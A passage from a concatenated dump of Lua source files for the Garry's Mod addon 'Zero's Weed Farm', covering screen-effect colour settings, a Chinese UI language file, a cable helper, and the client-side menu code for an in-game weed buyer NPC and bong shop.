                ["pp_colour_brightness"] = -0.3,
                ["pp_colour_contrast"] = 1,
                ["pp_colour_colour"] = 1,

                ["pp_colour_mulr"] = 0,
                ["pp_colour_mulg"] = 0,
                ["pp_colour_mulb"] = 0
            }
        },

        [2] = {

            mat = "zerochain/zwf/effect/zwf_high_effect02",
            warp_mat = "zerochain/zwf/effect/zwf_high_effect02_warp",
            bloom = {0.901,  0, 0.231},
            colormodify = {

                ["pp_colour_addr"] = 0.901,
                ["pp_colour_addg"] = 0,
                ["pp_colour_addb"] = 0.231,
                ["pp_colour_brightness"] = -0.2,
                ["pp_colour_contrast"] = 1,
                ["pp_colour_colour"] = 0.8,
                ["pp_colour_mulr"] = 0,
                ["pp_colour_mulg"] = 0,
                ["pp_colour_mulb"] = 0
            }
        },
        [3] = {

            mat = "zerochain/zwf/effect/zwf_high_effect03",
            warp_mat = "zerochain/zwf/effect/zwf_high_effect03_warp",
            bloom = {0.376,  0.466, 0.074},
            colormodify = {

                ["pp_colour_addr"] = 0.376,
                ["pp_colour_addg"] = 0.466,
                ["pp_colour_addb"] = 0.074,
                ["pp_colour_brightness"] = -0.3,
                ["pp_colour_contrast"] = 1,
                ["pp_colour_colour"] = 0.5,
                ["pp_colour_mulr"] = 0,
                ["pp_colour_mulg"] = 0,
                ["pp_colour_mulb"] = 0
            }
        },
        [4] = {

            mat = "zerochain/zwf/effect/zwf_high_effect04",
            warp_mat = "zerochain/zwf/effect/zwf_high_effect04_warp",
            bloom = {0.752,  0.101, 1},
            colormodify = {

                ["pp_colour_addr"] = 0.752,
                ["pp_colour_addg"] = 0.101,
                ["pp_colour_addb"] = 1,
                ["pp_colour_brightness"] = -0.6,
                ["pp_colour_contrast"] = 1,
                ["pp_colour_colour"] = 0.5,
                ["pp_colour_mulr"] = 0,
                ["pp_colour_mulg"] = 0,
                ["pp_colour_mulb"] = 0
            }
        },
        [5] = {

            mat = "zerochain/zwf/effect/zwf_high_effect05",
            warp_mat = "zerochain/zwf/effect/zwf_high_effect05_warp",
            bloom = {0.349,  0.501, 0},
            colormodify = {

                ["pp_colour_addr"] = 0.349,
                ["pp_colour_addg"] = 0.501,
                ["pp_colour_addb"] = 0,
                ["pp_colour_brightness"] = -0.5,
                ["pp_colour_contrast"] = 1,
                ["pp_colour_colour"] = 0.2,
                ["pp_colour_mulr"] = 0,
                ["pp_colour_mulg"] = 0,
                ["pp_colour_mulb"] = 0
            }
        },
        [6] = {

            mat = "zerochain/zwf/effect/zwf_high_effect06",
            warp_mat = "zerochain/zwf/effect/zwf_high_effect06_warp",
            bloom = {0.729,  0.125, 0.211},
            colormodify = {

                ["pp_colour_addr"] = 0.729,
                ["pp_colour_addg"] = 0.125,
                ["pp_colour_addb"] = 0.211,
                ["pp_colour_brightness"] = -0.5,
                ["pp_colour_contrast"] = 1,
                ["pp_colour_colour"] = 0.2,
                ["pp_colour_mulr"] = 0,
                ["pp_colour_mulg"] = 0,
                ["pp_colour_mulb"] = 0
            }
        },
        [7] = {

            mat = "zerochain/zwf/effect/zwf_high_effect07",
            warp_mat = "zerochain/zwf/effect/zwf_high_effect07_warp",
            bloom = {0.560,  0.050, 0.788},
            colormodify = {

                ["pp_colour_addr"] = 0.560,
                ["pp_colour_addg"] = 0.050,
                ["pp_colour_addb"] = 0.788,
                ["pp_colour_brightness"] = -0.5,
                ["pp_colour_contrast"] = 1,
                ["pp_colour_colour"] = 0.2,
                ["pp_colour_mulr"] = 0,
                ["pp_colour_mulg"] = 0,
                ["pp_colour_mulb"] = 0
            }
        },
    }
}

--PATH addons/zeros_weedfarm/lua/zwf_languages/sh_zwf_language_cn.lua:
zwf = zwf or {}
zwf.language = zwf.language or {}

zwf.language.General = zwf.language.General or {}
zwf.language.Shop = zwf.language.Shop or {}
zwf.language.NPC = zwf.language.NPC or {}
zwf.language.VGUI = zwf.language.VGUI or {}
zwf.language.Settings = zwf.language.Settings or {}


if (zwf.config.SelectedLanguage == "cn") then

    zwf.language.General["Fuel"] = "燃料"

    zwf.language.General["THC"] = "THC"
    zwf.language.General["Remove"] = "删除"
    zwf.language.General["Splice"] = "组合" // The splice button on the seed lab for creating new seeds

    zwf.language.General["Bad"] = "坏的"
    zwf.language.General["Good"] = "好的"

    zwf.language.General["Collect"] = "收集"

    zwf.language.General["Speed"] = "速度"
    zwf.language.General["Productivity"] = "生产率"
    zwf.language.General["AntiPlague"] = "反瘟疫"

    zwf.language.General["Water"] = "水"

    zwf.language.General["invalid_character"] = "名称包含无效字符!"
    zwf.language.General["name_too_short"] = "名字太短!"
    zwf.language.General["name_too_long"] = "名字太长!"

    zwf.language.General["Cancel"] = "取消"
    zwf.language.General["Enter"] = "确认"

    zwf.language.General["ItemBought"] = "你买了 $itemname 花了 $currency$price!"


    zwf.language.General["seedlab_titlescreen"] = "种子实验室"
    zwf.language.General["seedlab_help"] = "确认种子名字"

    zwf.language.General["watertank_refill"] = "重新装满"
    zwf.language.General["watertank_title"] = "水箱"

    zwf.language.General["bong_pickup_fail"] = "你已经拥有吸烟器了!"
    zwf.language.General["bong_no_weed"] = "无杂草!"

    zwf.language.General["generator_repair"] = "修理!"
    zwf.language.General["generator_start"] = "开始"
    zwf.language.General["generator_stop"] = "停下"
    zwf.language.General["generator_nofuel"] = "没有燃料!"

    zwf.language.General["packingstation_info"] = "加一罐杂草."
    zwf.language.General["packingstation_weedmix"] = "混和杂草" // If the player mixes diffrent sorts of weed together then we change the name of the weed to this

    zwf.language.General["seedbank_full"] = "种子库已满!"

    zwf.language.General["plant_heal"] = "救我" // The heal button
    zwf.language.General["plant_harvest"] = "收获" // The harvest button
    zwf.language.General["plant_infected"] = "染上!" // Tells us that the plant is infected
    zwf.language.General["plant_postgrow"] = "发育" // Tells us that the plant is in the post grow phase where it keeps growing till it reaches its max weedamount
    zwf.language.General["plant_empty"] = "空的" // Tells the player that the flowerpot is empty

    zwf.language.General["not_enough_money"] = "你负担不起!"
    zwf.language.General["not_correct_rank"] = "你没有这个所需的等级!"
    zwf.language.General["entity_limit"] = "您已达到实体限制 $itemname!"


    zwf.language.General["CableDistanceFail"] = "物体离得很远!"

    zwf.language.General["BongSharingFail"] = "$PlayerName 已经装备了!"

    zwf.language.General["WeedBlock"] = "杂草块"

    zwf.language.General["WrongJob"] = "错误的职业!"


    zwf.language.VGUI["Purchase"] = "购买"
    zwf.language.VGUI["SellWeed"] = "卖杂草"
    zwf.language.VGUI["Drop"] = "丢下"
    zwf.language.VGUI["Delete"] = "删除"
    zwf.language.VGUI["weedbuyer_title"] = "杂草经销商"
    zwf.language.VGUI["seedbank_title"] = "种子库"
    zwf.language.VGUI["Strain"] = "损伤"
    zwf.language.VGUI["Duration"] = "所需时间"
    zwf.language.VGUI["Difficulty"] = "难度"
    zwf.language.VGUI["HarvestAmount"] = "收获量"
    zwf.language.VGUI["THCBoost"] = "THC 促进"
    zwf.language.VGUI["GrowTimeBoost"] = "增长时间提升"
    zwf.language.VGUI["GrowAmountBoost"] = "增长量增加"
    zwf.language.VGUI["THCBoost"] = "THC 促进"
    zwf.language.VGUI["SeedCount"] = "种子计数"
    zwf.language.VGUI["PowerUsage"] = "电力使用"
    zwf.language.VGUI["HeatProduction"] = "产热"
    zwf.language.VGUI["Ranks"] = "等级"
    zwf.language.VGUI["SeedName"] = "种子名称"




    zwf.language.NPC["title"] = "杂草经销商"
    zwf.language.NPC["profit"] = "利润"
    zwf.language.NPC["interact_fail"] = "走开!"
    zwf.language.NPC["interact_noweed"] = "有东西再来找我!"


    zwf.language.Shop["title"] = "种植店"

    zwf.language.Shop["category_Equipment"] = "设备"

    zwf.language.Shop["item_generator_title"] = "发电机"
    zwf.language.Shop["item_generator_desc"] = "利用燃料发电."

    zwf.language.Shop["item_fuel_title"] = "燃料"
    zwf.language.Shop["item_fuel_desc"] = "发电厂燃料."

    zwf.language.Shop["item_lamp01_desc"] = "为植物提供光,增加植物的温度."
    zwf.language.Shop["item_lamp02_desc"] = "为植物提供光而不增加其温度."

    zwf.language.Shop["item_ventilator_title"] = "风扇"
    zwf.language.Shop["item_ventilator_desc"] = "降低植物温度."

    zwf.language.Shop["item_outlet_title"] = "排插座"
    zwf.language.Shop["item_outlet_desc"] = "让您为多台机器供电."

    zwf.language.Shop["item_flowerpot01_title"] = "花盆"
    zwf.language.Shop["item_flowerpot01_desc"] = "生长植物的正常花盆."

    zwf.language.Shop["item_flowerpot02_title"] = "水力花盆"
    zwf.language.Shop["item_flowerpot02_desc"] = "用来种植植物.可连接到水箱自动供水."

    zwf.language.Shop["item_soil_title"] = "土壤"
    zwf.language.Shop["item_soil_desc"] = "植物生长基质."

    zwf.language.Shop["item_watertank_title"] = "水箱"
    zwf.language.Shop["item_watertank_desc"] = "为植物生产水."

    zwf.language.Shop["item_drystation_title"] = "干燥架"
    zwf.language.Shop["item_drystation_desc"] = "用来干燥草."

    zwf.language.Shop["item_packingtable_title"] = "包装台"
    zwf.language.Shop["item_packingtable_desc"] = "用于将杂草罐打包成一个块以便运输."

    zwf.language.Shop["item_autopacker_title"] = "自动包装机"
    zwf.language.Shop["item_autopacker_desc"] = "可以安装在包装台上以实现流程自动化."

    zwf.language.Shop["item_seedlab_title"] = "种子实验室"
    zwf.language.Shop["item_seedlab_desc"] = "允许您从杂草中创建新种子."

    zwf.language.Shop["item_seedbank_title"] = "种子库"
    zwf.language.Shop["item_seedbank_desc"] = "让你储存种子."

    zwf.language.Shop["item_palette_title"] = "调色板"
    zwf.language.Shop["item_palette_desc"] = "用于向杂草经销商出售杂草块."


    zwf.language.Shop["item_seed01_desc"] = "OG Kush 是一个具有传奇色彩的品种,它的名字甚至在大麻世界之外也得到了认可。."
    zwf.language.Shop["item_seed02_desc"] = "Bubba Kush 是一种深受欢迎的重印度杂交种."
    zwf.language.Shop["item_seed03_desc"] = "Sour Diesel 是高能量和高积极性使得人们很容易理解为什么这种压力在美国广受欢迎。."
    zwf.language.Shop["item_seed04_desc"] = "AK-47 是一个以亮白色为主的杂交品种."
    zwf.language.Shop["item_seed05_desc"] = "超级柠檬薄雾的基因结合甜和酸."
    zwf.language.Shop["item_seed06_desc"] = "Strawberry Cough 是提神的`注重味道的莎提娃杂交品种。."
    zwf.language.Shop["item_seed07_desc"] = "这种菌株的紫色特征是从巴基斯坦兴都库什的几丁质地区的祖先那里遗传来的."

    zwf.language.Shop["category_Nutritions"] = "肥料"

    zwf.language.Shop["item_nutrition01_desc"] = "对你的植物有小的促进作用."
    zwf.language.Shop["item_nutrition02_desc"] = "大大提高了植物的生长速度."
    zwf.language.Shop["item_nutrition03_desc"] = "为你的植物增加一点收获."
    zwf.language.Shop["item_nutrition04_desc"] = "大量增加植物的收获量."
    zwf.language.Shop["item_nutrition05_desc"] = "同时提高收获量和生长速度."
    zwf.language.Shop["item_nutrition06_desc"] = "收获量和生长速度都大大增加."

    zwf.language.Shop["category_Seeds"] = "种子"


    // Joint UPDATE
    zwf.language.General["joint_pickup_fail"] = "你已经有一个连接点了!"
    zwf.language.General["JointSharingFail"] = "$PlayerName 已经连接了!"

    zwf.language.NPC["question_01"] = "你想要什么?"
    zwf.language.NPC["question_01_answer01"] = "我想买个水烟枪"
    zwf.language.NPC["question_01_answer02"] = "我拿了些大麻给你"
    zwf.language.NPC["question_01_answer03"] = "没事"

    zwf.language.NPC["question_02"] = "你想要哪一个?"
    zwf.language.NPC["question_02_answer01"] = "退回" // This is the Back button on the NPC BongShop interface

end

--PATH addons/zeros_weedfarm/lua/zweedfarm/sh/zwf_cable_sh.lua:
if CLIENT then return end
zwf = zwf or {}
zwf.f = zwf.f or {}

function zwf.f.MultiConnection_GetFreePosID(outlet)
    local id

    if not IsValid(outlet:GetOutput01()) then
        id = 1
    elseif not IsValid(outlet:GetOutput02()) then
        id = 2
    elseif not IsValid(outlet:GetOutput03()) then
        id = 3
    end

    return id
end

--PATH addons/zeros_weedfarm/lua/zweedfarm/cl/zwf_npc_vgui.lua:
if not CLIENT then return end

local wMod = ScrW() / 1920
local hMod = ScrH() / 1080

local zwf_WeedBuyerMenu = {}
local zwf_WeedBuyerMain = {}

zwf_player_SELECTED_BONG_ITEM = 1

/////////// General
local function zwf_OpenUI()
	if not IsValid(zwf_WeedBuyerMenu_panel) then

		zwf_WeedBuyerMenu_panel = vgui.Create("zwf_vgui_WeedBuyerMenu")
	end
end

local function zwf_CloseUI()

	if IsValid(zwf_WeedBuyerMenu_panel) then
		zwf_WeedBuyerMenu_panel:Remove()
	end
	LocalPlayer().zwf_WeedBuyer = nil
end
///////////


// This closes the shop interface
net.Receive("zwf_CloseNPC", function(len)
	zwf_CloseUI()
end)


// This opens the NPC interface
net.Receive("zwf_OpenNPC", function(len)

	LocalPlayer().zwf_WeedBuyer = net.ReadEntity()

	zwf_OpenUI()
end)

/////////// Init
function zwf_WeedBuyerMenu:Init()
	self:SetSize(900 * wMod, 300 * hMod)
	self:Center()
	self:MakePopup()
	self:SetTitle("")
	self:SetSizable(false)
	self:SetDraggable(true)
	self:ShowCloseButton(false)

	zwf_WeedBuyer_Main(self)
end

function zwf_WeedBuyerMenu:Paint(w, h)
	draw.RoundedBox(15, 0 , 0, w, h,  zwf.default_colors["gray01"])
end

function zwf_WeedBuyer_Main(parent)

	if (zwf_WeedBuyerMain and IsValid(zwf_WeedBuyerMain.BongShopPanel)) then
		zwf_WeedBuyerMain.BongShopPanel:Remove()
	end


	if (zwf_BongShopList and IsValid(zwf_BongShopList.ProductPanel)) then
		zwf_BongShopList.ProductPanel:Remove()
	end

	if (zwf_WeedBuyerMain and IsValid(zwf_WeedBuyerMain.QuestionPanel)) then
		zwf_WeedBuyerMain.QuestionPanel:Remove()
	end

	zwf_WeedBuyerMain.QuestionPanel = vgui.Create("Panel", parent)
	zwf_WeedBuyerMain.QuestionPanel:SetPos(0 * wMod, 0 * hMod)
	zwf_WeedBuyerMain.QuestionPanel:SetSize(900 * wMod, 300 * hMod)
	zwf_WeedBuyerMain.QuestionPanel.Paint = function(s, w, h)
		//draw.RoundedBox(15, 0 , 0, w, h,  zwf.default_colors["black05"])
	end


	zwf_WeedBuyerMain.Question = vgui.Create("DLabel", zwf_WeedBuyerMain.QuestionPanel)
	zwf_WeedBuyerMain.Question:SetPos(300 * wMod, 25 * hMod)
	zwf_WeedBuyerMain.Question:SetSize(600 * wMod, 50 * hMod)
	zwf_WeedBuyerMain.Question:SetFont("zwf_vgui_font12")
	zwf_WeedBuyerMain.Question:SetText(zwf.language.NPC["question_01"])
	zwf_WeedBuyerMain.Question:SetContentAlignment(7)
	zwf_WeedBuyerMain.Question:SetColor(zwf.default_colors["white01"])

	zwf_WeedBuyerMain.OpenBongShop = vgui.Create("DButton", zwf_WeedBuyerMain.QuestionPanel)
	zwf_WeedBuyerMain.OpenBongShop:SetText("")
	zwf_WeedBuyerMain.OpenBongShop:SetPos(150 * wMod, 162 * hMod)
	zwf_WeedBuyerMain.OpenBongShop:SetSize(850 * wMod, 50 * hMod)
	zwf_WeedBuyerMain.OpenBongShop.DoClick = function()
		surface.PlaySound("UI/buttonclick.wav")
		zwf_WeedBuyer_BongShop(parent)
	end
	zwf_WeedBuyerMain.OpenBongShop.Paint = function(s,w, h)

		draw.RoundedBox(1, 0 , 0, w, h,  zwf.default_colors["black06"])

		if zwf_WeedBuyerMain.OpenBongShop:IsHovered() then
			//draw.DrawText("I want to buy a Bong!", "zwf_vgui_font13", 450 * wMod, 5 * hMod, zwf.default_colors["green06"], TEXT_ALIGN_CENTER)
			draw.SimpleTextOutlined(zwf.language.NPC["question_01_answer01"], "zwf_vgui_font13", 210 * wMod, 5 * hMod, zwf.default_colors["orange06"], TEXT_ALIGN_LEFT, TEXT_ALIGN_TOP, 2, zwf.default_colors["black02"])
			surface.SetDrawColor(zwf.default_colors["orange06"])
		else
			draw.DrawText(zwf.language.NPC["question_01_answer01"], "zwf_vgui_font13", 210 * wMod, 5 * hMod, zwf.default_colors["orange05"], TEXT_ALIGN_LEFT)
			surface.SetDrawColor(zwf.default_colors["orange05"])
		end

		surface.SetMaterial(zwf.default_materials["symbol_bong"])
		surface.DrawTexturedRect(150 * wMod, 1 * hMod, 50 * wMod, 50 * hMod)
	end

	if zwf.f.IsWeedSeller(LocalPlayer()) then
		zwf_WeedBuyerMain.SellWeed = vgui.Create("DButton", zwf_WeedBuyerMain.QuestionPanel)
		zwf_WeedBuyerMain.SellWeed:SetText("")
		zwf_WeedBuyerMain.SellWeed:SetPos(150 * wMod, 100 * hMod)
		zwf_WeedBuyerMain.SellWeed:SetSize(850 * wMod, 50 * hMod)
		zwf_WeedBuyerMain.SellWeed.DoClick = function()
			net.Start("zwf_SellWeed")
			net.WriteEntity(LocalPlayer().zwf_WeedBuyer)
			net.SendToServer()

			surface.PlaySound("UI/buttonclick.wav")
			zwf_CloseUI()
		end
		zwf_WeedBuyerMain.SellWeed.Paint = function(s,w, h)

			draw.RoundedBox(1, 0 , 0, w, h,  zwf.default_colors["black06"])

			if zwf_WeedBuyerMain.SellWeed:IsHovered() then
				//draw.DrawText("I got some Weed for you.", "zwf_vgui_font13", 450 * wMod, 5 * hMod, zwf.default_colors["orange02"], TEXT_ALIGN_CENTER)
				draw.SimpleTextOutlined(zwf.language.NPC["question_01_answer02"], "zwf_vgui_font13", 210 * wMod, 5 * hMod, zwf.default_colors["green10"], TEXT_ALIGN_LEFT, TEXT_ALIGN_TOP, 2, zwf.default_colors["black02"])
				surface.SetDrawColor(zwf.default_colors["green10"])
			else
				draw.DrawText(zwf.language.NPC["question_01_answer02"], "zwf_vgui_font13", 210 * wMod, 5 * hMod, zwf.default_colors["green09"], TEXT_ALIGN_LEFT)
				surface.SetDrawColor(zwf.default_colors["green09"])
			end

			surface.SetMaterial(zwf.default_materials["symbol_weed"])
			surface.DrawTexturedRect(150 * wMod, 1 * hMod, 50 * wMod, 50 * hMod)
		end
	end

	zwf_WeedBuyerMain.close = vgui.Create("DButton", zwf_WeedBuyerMain.QuestionPanel)
	zwf_WeedBuyerMain.close:SetText("")
	zwf_WeedBuyerMain.close:SetPos(150 * wMod, 225 * hMod)
	zwf_WeedBuyerMain.close:SetSize(850 * wMod, 50 * hMod)
	zwf_WeedBuyerMain.close.DoClick = function()
		zwf_CloseUI()
		surface.PlaySound("UI/buttonclick.wav")
	end
	zwf_WeedBuyerMain.close.Paint = function(s,w, h)

		draw.RoundedBox(1, 0 , 0, w, h,  zwf.default_colors["black06"])

		if zwf_WeedBuyerMain.close:IsHovered() then
			//draw.DrawText("Nothing", "zwf_vgui_font13", 450 * wMod, 5 * hMod, zwf.default_colors["red03"], TEXT_ALIGN_CENTER)
			draw.SimpleTextOutlined(zwf.language.NPC["question_01_answer03"], "zwf_vgui_font13", 210 * wMod, 5 * hMod, zwf.default_colors["red01"], TEXT_ALIGN_LEFT, TEXT_ALIGN_TOP, 2, zwf.default_colors["black02"])
			surface.SetDrawColor(zwf.default_colors["red01"])
		else
			draw.DrawText(zwf.language.NPC["question_01_answer03"], "zwf_vgui_font13", 210 * wMod, 5 * hMod, zwf.default_colors["red02"], TEXT_ALIGN_LEFT)
			surface.SetDrawColor(zwf.default_colors["red02"])
		end

		surface.SetMaterial(zwf.default_materials["symbol_cancel"])
		surface.DrawTexturedRect(150 * wMod, 1 * hMod, 50 * wMod, 50 * hMod)
	end

	zwf_WeedBuyerMain.QuestionImg01 = vgui.Create("Panel", zwf_WeedBuyerMain.QuestionPanel)
	zwf_WeedBuyerMain.QuestionImg01:SetPos(0 * wMod, 0 * hMod)
	zwf_WeedBuyerMain.QuestionImg01:SetSize(300 * wMod, 300 * hMod)
	zwf_WeedBuyerMain.QuestionImg01.Paint = function(s, w, h)
		surface.SetDrawColor(zwf.default_colors["white01"])
		surface.SetMaterial(zwf.default_materials["weedbuyer"])
		surface.DrawTexturedRect(0 * wMod, 1 * hMod, w, h)
	end
end

function zwf_WeedBuyer_BongShop(parent)



	if (zwf_WeedBuyerMain and IsValid(zwf_WeedBuyerMain.QuestionPanel)) then
		zwf_WeedBuyerMain.QuestionPanel:Remove()
	end

	if (zwf_WeedBuyerMain and IsValid(zwf_WeedBuyerMain.BongShopPanel)) then
		zwf_WeedBuyerMain.BongShopPanel:Remove()
	end

	zwf_WeedBuyerMain.BongShopPanel = vgui.Create("Panel", parent)
	zwf_WeedBuyerMain.BongShopPanel:SetPos(0 * wMod, 0 * hMod)
	zwf_WeedBuyerMain.BongShopPanel:SetSize(900 * wMod, 300 * hMod)
	zwf_WeedBuyerMain.BongShopPanel.Paint = function(s, w, h)
		//draw.RoundedBox(15, 0 , 0, w, h,  zwf.default_colors["black05"])
	end


	zwf_WeedBuyerMain.BongQuestion = vgui.Create("DLabel", zwf_WeedBuyerMain.BongShopPanel)
	zwf_WeedBuyerMain.BongQuestion:SetPos(300 * wMod, 25 * hMod)
	zwf_WeedBuyerMain.BongQuestion:SetSize(600 * wMod, 50 * hMod)
	zwf_WeedBuyerMain.BongQuestion:SetFont("zwf_vgui_font12")
	zwf_WeedBuyerMain.BongQuestion:SetText(zwf.language.NPC["question_02"])
	zwf_WeedBuyerMain.BongQuestion:SetContentAlignment(7)
	zwf_WeedBuyerMain.BongQuestion:SetColor(zwf.default_colors["white01"])




	zwf_WeedBuyerMain.GoBack = vgui.Create("DButton", zwf_WeedBuyerMain.BongShopPanel)
	zwf_WeedBuyerMain.GoBack:SetText("")
	zwf_WeedBuyerMain.GoBack:SetPos(300 * wMod, 225 * hMod)
	zwf_WeedBuyerMain.GoBack:SetSize(275 * wMod, 50 * hMod)
	zwf_WeedBuyerMain.GoBack.DoClick = function()
		zwf_WeedBuyer_Main(zwf_WeedBuyerMenu_panel)
		surface.PlaySound("UI/buttonclick.wav")
	end
	zwf_WeedBuyerMain.GoBack.Paint = function(s,w, h)

		draw.RoundedBox(5, 0 , 0, w, h,  zwf.default_colors["black06"])

		if zwf_WeedBuyerMain.GoBack:IsHovered() then
			draw.SimpleTextOutlined(zwf.language.NPC["question_02_answer01"], "zwf_vgui_font13", 137 * wMod, 5 * hMod, zwf.default_colors["red01"], TEXT_ALIGN_CENTER, TEXT_ALIGN_TOP, 2, zwf.default_colors["black02"])
			//draw.DrawText("Go Back", "zwf_vgui_font13", 200 * wMod, 5 * hMod, zwf.default_colors["red03"], TEXT_ALIGN_CENTER)
		else
			draw.DrawText(zwf.language.NPC["question_02_answer01"], "zwf_vgui_font13", 137 * wMod, 5 * hMod, zwf.default_colors["red02"], TEXT_ALIGN_CENTER)
		end
	end


	zwf_WeedBuyerMain.BuyBong = vgui.Create("DButton", zwf_WeedBuyerMain.BongShopPanel)
	zwf_WeedBuyerMain.BuyBong:SetText("")
	zwf_WeedBuyerMain.BuyBong:SetPos(600 * wMod, 225 * hMod)
	zwf_WeedBuyerMain.BuyBong:SetSize(275 * wMod, 50 * hMod)
	zwf_WeedBuyerMain.BuyBong.DoClick = function()
		if zwf_player_SELECTED_BONG_ITEM and zwf_player_SELECTED_BONG_ITEM > 0 then

			net.Start("zwf_BuyBong")
			net.WriteInt(zwf_player_SELECTED_BONG_ITEM, 16)
			net.WriteEntity(LocalPlayer().zwf_WeedBuyer)
			net.SendToServer()
			surface.PlaySound("UI/buttonclick.wav")
			zwf_CloseUI()
		end
	end
	zwf_WeedBuyerMain.BuyBong.Paint = function(s,w, h)

		draw.RoundedBox(5, 0 , 0, w, h,  zwf.default_colors["black06"])

		if zwf_WeedBuyerMain.BuyBong:IsHovered() then
			draw.SimpleTextOutlined(zwf.language.VGUI["Purchase"], "zwf_vgui_font13", 137 * wMod, 5 * hMod, zwf.default_colors["green10"], TEXT_ALIGN_CENTER, TEXT_ALIGN_TOP, 2, zwf.default_colors["black02"])
		else
			draw.DrawText(zwf.language.VGUI["Purchase"], "zwf_vgui_font13", 137 * wMod, 5 * hMod, zwf.default_colors["green09"], TEXT_ALIGN_CENTER)
		end
	end

	zwf_WeedBuyerMain.QuestionImg02 = vgui.Create("Panel", zwf_WeedBuyerMain.BongShopPanel)
	zwf_WeedBuyerMain.QuestionImg02:SetPos(0 * wMod, 0 * hMod)
	zwf_WeedBuyerMain.QuestionImg02:SetSize(300 * wMod, 300 * hMod)
	zwf_WeedBuyerMain.QuestionImg02.Paint = function(s, w, h)
		surface.SetDrawColor(zwf.default_colors["white01"])
		surface.SetMaterial(zwf.default_materials["weedbuyer"])
		surface.DrawTexturedRect(0 * wMod, 1 * hMod, w, h)
	end
	zwf_BongList(zwf_WeedBuyerMain.BongShopPanel)
end


function zwf_AddBongShopItem(i)

	local itemData = zwf.config.Bongs.items[i]

	zwf_BongItems[i] = zwf_BongItems.list:Add("DPanel")
	zwf_BongItems[i]:SetSize(115 * wMod, 115 * hMod)
	zwf_BongItems[i]:SetAutoDelete(true)
	zwf_BongItems[i].Paint = function(self, w, h)

		if i == zwf_player_SELECTED_BONG_ITEM then
			draw.RoundedBox(1, 0, 0, w, h, zwf.default_colors["green08"])
		else
			draw.RoundedBox(1, 0, 0, w, h, zwf.default_colors["black05"])
		end

		surface.SetDrawColor(255, 255, 255, 7)
		surface.SetMaterial(zwf.default_materials["button_shine"])
		surface.DrawTexturedRect(-5 * wMod, -5 * hMod, w, h)
	end


	zwf_BongItems[i].ItemModel = vgui.Create("DModelPanel", zwf_BongItems[i])
	zwf_BongItems[i].ItemModel:SetSize(zwf_BongItems[i]:GetWide(), zwf_BongItems[i]:GetTall())
	zwf_BongItems[i].ItemModel:SetPos(0 * wMod, 0 * hMod)
	zwf_BongItems[i].ItemModel:SetModel(itemData.model)
	zwf_BongItems[i].ItemModel:SetAutoDelete(true)
	zwf_BongItems[i].ItemModel:SetColor(zwf.default_colors["white01"])
	zwf_BongItems[i].ItemModel.LayoutEntity = function(self)

		local ang = Angle(0, 45 * RealTime(), 0)

		self.Entity:SetAngles(ang)
		local size1, size2 = self.Entity:GetRenderBounds()
		local size = (-size1 + size2):Length()
		self:SetFOV(40)
		self:SetCamPos(Vector(size * 1, size * 1, size * 1))
		self:SetLookAt(self.Entity:GetPos() + Vector(0, 0, 0.43 * size))
	end

	zwf_BongItems[i].ItemNamePanel = vgui.Create("DPanel", zwf_BongItems[i])
	zwf_BongItems[i].ItemNamePanel:SetPos(0 * wMod, 0 * hMod)
	zwf_BongItems[i].ItemNamePanel:SetSize(zwf_BongItems[i]:GetWide(), 30 * hMod)
	zwf_BongItems[i].ItemNamePanel.Paint = function(s, w, h)
		surface.SetDrawColor(zwf.default_colors["black03"])
		surface.SetMaterial(zwf.default_materials["shadow_gradient"])
		surface.DrawTexturedRect(0, 0, w, h)
	end

	zwf_BongItems[i].ItemName = vgui.Create("DLabel", zwf_BongItems[i].ItemNamePanel)
	zwf_BongItems[i].ItemName:SetPos(10 * wMod, 5 * hMod)
	zwf_BongItems[i].ItemName:SetSize(300 * wMod, 125 * hMod)
	zwf_BongItems[i].ItemName:SetFont("zwf_vgui_font08")
	zwf_BongItems[i].ItemName:SetText(itemData.name)
	zwf_BongItems[i].ItemName:SetColor(zwf.default_colors["white01"])
	zwf_BongItems[i].ItemName:SetAutoDelete(true)
	zwf_BongItems[i].ItemName:SetContentAlignment(7)

	zwf_BongItems[i].ItemPrice = vgui.Create("DLabel", zwf_BongItems[i])
	zwf_BongItems[i].ItemPrice:SetPos( 5 * wMod, 90 * hMod)
	zwf_BongItems[i].ItemPrice:SetSize(300 * wMod, 125 * hMod)
	zwf_BongItems[i].ItemPrice:SetFont("zwf_vgui_font09")
	zwf_BongItems[i].ItemPrice:SetText(zwf.config.Currency .. itemData.price)
	zwf_BongItems[i].ItemPrice:SetColor(zwf.default_colors["white01"])
	zwf_BongItems[i].ItemPrice:SetAutoDelete(true)
	zwf_BongItems[i].ItemPrice:SetContentAlignment(7)

	zwf_BongItems[i].button = vgui.Create("DButton", zwf_BongItems[i])
	zwf_BongItems[i].button:SetPos(0 * wMod, 0 * hMod)
	zwf_BongItems[i].button:SetSize(zwf_BongItems[i]:GetWide(), zwf_BongItems[i]:GetTall())
	zwf_BongItems[i].button:SetText("")
	zwf_BongItems[i].button:SetAutoDelete(true)
	zwf_BongItems[i].button.Paint = function(self, w, h)
		if zwf_BongItems[i].button:IsHovered() then
			draw.RoundedBox(5, 0, 0, w, h, zwf.default_colors["white03"])
		end
	end
	zwf_BongItems[i].button.DoClick = function()
		zwf_player_SELECTED_BONG_ITEM = i
		surface.PlaySound("UI/buttonclick.wav")
	end
end

function zwf_BongList(parent)

	if (zwf_BongShopList and IsValid(zwf_BongShopList.ProductPanel)) then
		zwf_BongShopList.ProductPanel:Remove()
	end

	zwf_BongShopList = {}

	zwf_BongShopList.ProductPanel = vgui.Create("Panel", parent)
	zwf_BongShopList.ProductPanel:SetPos(300 * wMod, 85 * hMod)
	zwf_BongShopList.ProductPanel:SetSize(700 * wMod, 115 * hMod)
	zwf_BongShopList.ProductPanel.Paint = function(s, w, h)
		draw.RoundedBox(1, 0 , 0, w, h,  zwf.default_colors["black07"])
	end

	zwf_BongShopList.scrollpanel = vgui.Create("DScrollPanel", zwf_BongShopList.ProductPanel)
	zwf_BongShopList.scrollpanel:DockMargin(-15 * wMod, -15 * hMod, 0 * wMod, 0 * hMod)
	zwf_BongShopList.scrollpanel:Dock(FILL)
	local sbar01 = zwf_BongShopList.scrollpanel:GetVBar()
	function sbar01:Paint( w, h )
		//draw.RoundedBox( 0, 0, 0, w, h, zwf.default_colors["black06"] )
	end
	function sbar01.btnUp:Paint( w, h )
		//draw.RoundedBox( 5, 0, 0, w, h, zwf.default_colors["black01"] )
	end
	function sbar01.btnDown:Paint( w, h )
		//draw.RoundedBox( 5, 0, 0, w, h, zwf.default_colors["black01"] )
	end
	function sbar01.btnGrip:Paint( w, h )
		//draw.RoundedBox( 5, 0, 0, w, h, zwf.default_colors["white05"] )
	end
